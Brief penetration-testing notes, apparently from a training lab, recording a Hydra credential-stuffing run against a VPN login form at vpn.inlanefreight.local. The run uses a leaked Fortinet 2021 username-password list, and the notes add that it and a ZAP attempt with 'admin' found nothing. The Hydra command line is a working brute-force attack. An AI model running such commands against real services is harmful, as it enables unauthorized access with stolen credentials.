# Hydra `fortinet-2021_clean-combos.txt`
- Running leaked forticlient creds
```bash
hydra -C /opt/wordlist/seclist/Passwords/Leaked-Databases/fortinet-2021_clean-combos.txt -f vpn.inlanefreight.local  http-post-form "/verify.php:username=^USER^&credential=^PASS^&submit=:F=Access denied"
```
- Finished on 82252
![[Pasted image 20240902120246.png]]
- didn't give us anything...
![[Pasted image 20240903154615.png]]
# ZAP
- `admin` and passwords from `fortinet-2021_passwords.txt` didn't give anything
